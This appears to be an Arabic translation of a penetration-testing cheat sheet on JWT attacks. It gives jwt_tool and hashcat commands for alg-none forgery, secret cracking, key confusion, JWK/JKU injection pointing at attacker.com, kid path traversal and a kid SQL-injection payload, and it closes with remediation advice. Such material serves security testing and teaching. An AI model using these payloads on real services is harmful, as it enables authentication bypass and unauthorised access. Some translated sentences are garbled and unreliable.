<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ هجمات JWT - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="هجمات JWT">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="الهجمات الرئيسية">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="اختبار واجهة برمجة التطبيقات">
</ص>

<p align="center">
  <b>🛡️ منهجية شاملة وأوامر عملية لاستغلال ثغرات JSON Web Token (JWT)</b>
</ص>

---

## 📋 جدول المحتويات

- [مقدمة وتشريح JWT](#-مقدمة--تشريح-JWT)
- [أدوات الاختبار الأساسية](#-أدوات-الاختبار الأساسية)
- [مصفوفة الضعف ومتجهات الهجوم](#-مصفوفة الضعف--متجهات الهجوم)
  - [1. لا يوجد خلل في الخوارزمية (`alg: "none"`)](#1-لا شيء-خلل في الخوارزمية-alg-none)
  - [2. اختراق HMAC السري الضعيف (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. ارتباك الخوارزمية / ارتباك المفتاح (RS256 -> HS256)](#3-ارتباك الخوارزمية--ارتباك المفتاح-rs256---hs256)
  - [4. حقن رأس JWK (مفتاح ويب JSON)](#4-jwk-json-web-key-header-injection)
  - [5. التكوين الخاطئ لـ JKU (عنوان URL لمجموعة JWK) وSSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. معالجة رأس KID (معرف المفتاح) وحقنه](#6-معالجة رأس معرف مفتاح الطفل--الحقن)
  - [7. الترحيل عبر الخدمات وتسرب البيانات الحساسة](#7-الترحيل عبر الخدمات--تسرب البيانات الحساسة)
- [أتمتة الاختبارات باستخدام `jwt_tool`](#-automating-tests-with-jwt_tool)
- [تكسير أسرار JWT باستخدام Hashcat](#-تكسير-JWT-أسرار-مع-hashcat)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [المعالجة والتنفيذ الآمن](#-المعالجة--التنفيذ الآمن)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 مقدمة وتشريح JWT

**JSON Web Token (JWT)** عبارة عن وسيلة مدمجة وآمنة لعنوان URL لتمثيل المطالبات بين طرفين. يُستخدم بشكل شائع لمصادقة الجلسة في واجهات برمجة تطبيقات REST الحديثة وتطبيقات الصفحة الواحدة (SPA) والخدمات الصغيرة.

يتكون JWT القياسي من ثلاثة أجزاء مشفرة بـ Base64URL مفصولة بنقاط (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **الرأس:** يحدد نوع الرمز المميز وخوارزمية التشفير المستخدمة (على سبيل المثال، `HS256`، `RS256`، `none`).
2. **الحمولة:** تحتوي على المطالبات (على سبيل المثال، `user_id`، `role`، انتهاء الصلاحية `exp`). *ملاحظة: الحمولات مشفرة وليست مشفرة!*
3. **التوقيع:** تم إنشاؤه عن طريق تجزئة الرأس المشفر والحمولة باستخدام مفتاح سري أو مفتاح خاص.

---

## 🛠️ أدوات الاختبار الأساسية

1. **jwt_tool:** مجموعة أدوات سطر الأوامر لتحليل واختبار وتكسير JWTs.
2. **Hashcat:** تكسير سري HMAC سريع يعتمد على وحدة معالجة الرسومات (الوضع `16500`).
3. **ملحق Burp Suite:** "JWT Editor" بواسطة Fraser Winterborn (في متجر PortSwigger BApp).

### تثبيت `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 مصفوفة الضعف ومتجهات الهجوم

### 1. لا يوجد خطأ في الخوارزمية (`alg: "none"`)

**الآلية:**
تعتبر بعض مكتبات التحقق من JWT أن الرموز المميزة صالحة إذا تم تعيين رأس `alg` على `none`، مما يتجاوز التحقق من التوقيع تمامًا.

**الاستغلال:**
1. قم بفك تشفير الرأس وتغيير `"alg": "HS256"` إلى `"alg": "none"`.
2. تعديل مطالبات الحمولة (على سبيل المثال، `"role": "admin"`).
3. قم بإزالة جزء التوقيع (احتفظ بالنقطة الخلفية!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*هيكل الرمز اليدوي:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. كسر سري ضعيف لـ HMAC (HS256)

**الآلية:**
إذا قام الخادم بتوقيع الرموز المميزة باستخدام خوارزميات متماثلة (`HS256`، `HS384`، `HS512`) باستخدام مفتاح سري ضعيف أو يمكن تخمينه (على سبيل المثال، `secret`، `admin123`، اسم الشركة)، فيمكن للمهاجم فرض السر دون الاتصال بالإنترنت وتوقيع الرموز المميزة بشكل عشوائي.

** التكسير مع Hashcat: **
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**تزوير الرمز بعد التكسير:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. ارتباك الخوارزميات / ارتباك المفاتيح (RS256 -> HS256)

**الآلية:**
- **RS256 (غير متماثل):** موقّع باستخدام المفتاح الخاص للخادم؛ تم التحقق باستخدام **المفتاح العام** للخادم.
- **HS256 (متماثل):** تم التوقيع والتحقق منه باستخدام **نفس السر المشترك**.

إذا كانت مكتبة الواجهة الخلفية لا تطبق أنواع الخوارزميات بشكل صارم، فيمكن للمهاجم:
1. احصل على المفتاح العام للخادم (غالبًا ما يتم عرضه علنًا على `/.well-known/jwks.json` أو الشهادات).
2. قم بتغيير رأس خوارزمية الرمز المميز من `RS256` إلى `HS256`.
3. قم بتوقيع الرمز المميز المعدل باستخدام **المفتاح العام** للخادم باعتباره سر HMAC!
4. يتلقى الخادم الرمز المميز، ويرى `HS256`، ويتحقق من التوقيع باستخدام مفتاح التحقق الذي تم تكوينه (وهو مفتاحه العام)، مما يؤدي إلى توقيع صالح!

**الاستغلال عبر `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. حقن رأس JWK (مفتاح ويب JSON).

**الآلية:**
تسمح مواصفات JWT بمفتاح عام مضمن في معلمة رأس `jwk`. تثق الخوادم الضعيفة بمفتاح الرأس هذا للتحقق من التوقيع دون التحقق مما إذا كان المفتاح ينتمي إلى مرجع مصدق موثوق به أو قائمة بيضاء مشتركة مسبقًا.

**الاستغلال:**
1. قم بإنشاء زوج مفاتيح RSA مهاجم.
2. قم بتضمين المفتاح العام في رأس `jwk`.
3. قم بتوقيع الرمز باستخدام مفتاحك الخاص المطابق.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. التكوين الخاطئ لـ JKU (عنوان URL لمجموعة JWK) وSSRF

**الآلية:**
يحدد رأس `jku` (JWK Set URL) عنوان URL البعيد الذي يجب على الخادم جلب مجموعة المفاتيح العامة منه للتحقق من الرمز المميز.

**الاستغلال:**
1. قم باستضافة `jwks.json` الخاص بك على خادم ويب مهاجم:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. تعديل رأس الرمز المميز:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. قم بتوقيع الرمز باستخدام مفتاحك الخاص.

> **تجاوز القوائم البيضاء لعناوين URL:**
> إذا كان التطبيق يتحقق من صحة نهايات النطاق، فاختبر عمليات إعادة التوجيه المفتوحة أو مراوغات تحليل عنوان URL:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - فتح إعادة التوجيه: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. معالجة رأسية KID (معرف المفتاح) وحقنها

رأس `kid` عبارة عن سلسلة تُستخدم لتحديد المفتاح الذي يجب تحميله من قاعدة البيانات أو نظام الملفات.

#### أ. اجتياز الدليل إلى الملف الفارغ (`/dev/null`)
إذا قرأ الخادم ملف المفتاح من القرص باستخدام `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
قم بتوقيع الرمز المميز بسر فارغ (`""` / 0 بايت)!

#### B. حقن SQL عبر KID
إذا كان الخادم يجلب السر من قاعدة بيانات:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
أدخل سلسلة ثابتة معروفة:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
قم بالتوقيع على الرمز باستخدام الرمز السري `'my_known_secret'`.

---

### 7. الترحيل عبر الخدمات وتسرب البيانات الحساسة

- **معلومات تحديد الهوية الشخصية غير المشفرة:** يقوم المطورون بشكل متكرر بتخزين كلمات المرور أو شبكات الأمان الاجتماعي أو بيانات تعريف المستخدم الحساسة في الحمولة، متناسين أنها مشفرة بـ Base64URL فقط، وليست مشفرة.
- **ارتباك الخدمة:** استخدام رمز مميز مخصص لخدمة منخفضة الامتيازات (على سبيل المثال، واجهة برمجة تطبيقات التحليلات) مقابل واجهة برمجة تطبيقات إدارية داخلية.

---

## ⚡ أتمتة الاختبارات باستخدام `jwt_tool`

### تشغيل جميع هجمات قواعد اللعبة المضمنة
أسهل طريقة للبحث عن جميع الثغرات الأمنية المعروفة تلقائيًا:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### وضع العبث التفاعلي
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 كشف أسرار JWT باستخدام Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 جدول مرجعي سريع

| الضعف | تقنية الهجوم | الحمولة الرئيسية / العلم |
|---------------|------------------|--------------------|
| ** لا يوجد خوارزمية ** | تعيين `alg: "none"`، توقيع الشريط | `jwt_tool <TOKEN> -X a` |
| **السر الضعيف** | قاموس GPU القوة الغاشمة | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **ارتباك الخوارزمية**| قم بتغيير RS256 إلى HS256، قم بالتوقيع بالمفتاح العام | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **حقنة JWK** | تضمين المفتاح العام للمهاجم في الرأس | `jwt_tool <TOKEN> -X i` |
| ** حقن JKU ** | قم بتوجيه `jku` إلى خادم خارجي | `"jku": "http://evil.com/jwks.json"` |
| ** اجتياز مسار الطفل **| قم بتوجيه `kid` إلى `/dev/null` أو الملف المعروف | `"kid": "/dev/null"` (التوقيع باستخدام `""`) |
| **كيد سكلي** | أدخل سرًا ثابتًا في استعلام SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ المعالجة والتنفيذ الآمن

1. **إضافة خوارزميات القائمة البيضاء بشكل صريح:**
   لا تسمح مطلقًا باختيار `alg` الذي يتحكم فيه العميل. يسمح الرمز الثابت بالخوارزميات الموجودة على الخادم (على سبيل المثال، السماح حصريًا بـ `RS256`).
2. **رفض رموز `alg: none`:**
   تأكد من أن المكتبة ترفض بشدة الرموز المميزة التي لم يتم التحقق منها أو غير الموقعة.
3. **استخدم أسرارًا طويلة وآمنة للتشفير:**
   يجب أن تكون أسرار HMAC 256 بت على الأقل (32+ حرفًا عشوائيًا) تم إنشاؤها بواسطة CSPRNG الآمن.
4. **التحقق من صحة رؤوس `jku` و`jwk`:**
   جلب مجموعات JWK فقط من القائمة البيضاء الصارمة لعناوين URL الداخلية الموثوقة؛ رفض المجالات الخارجية التي يوفرها المستخدم.
5. **تطهير قيم `kid`:**
   التعامل مع `kid` كمدخل مستخدم غير موثوق به؛ التعقيم ضد اجتياز الدليل (`../`) وحقن SQL.

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** يمكن أن تؤدي هجمات JWT إلى تجاوز المصادقة الكاملة والوصول غير المصرح به إلى قواعد بيانات التطبيق. هذا الدليل مخصص بشكل صارم للأغراض التعليمية واختبار الاختراق المعتمد.

---

## 📚 المصادر

- [مستودع جيثب jwt_tool](https://github.com/ticarpi/jwt_tool)
- [أكاديمية PortSwigger Web Security: هجمات JWT](https://portswigger.net/web-security/jwt)
- [RFC 7519 - معيار JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)